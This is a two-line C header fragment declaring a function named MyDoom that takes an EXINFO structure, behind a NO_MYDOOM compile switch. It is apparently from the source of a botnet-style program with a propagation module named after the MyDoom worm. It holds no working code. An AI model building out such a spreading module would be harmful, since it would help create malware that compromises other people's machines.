#ifndef NO_MYDOOM
BOOL MyDoom(EXINFO exinfo);
#endif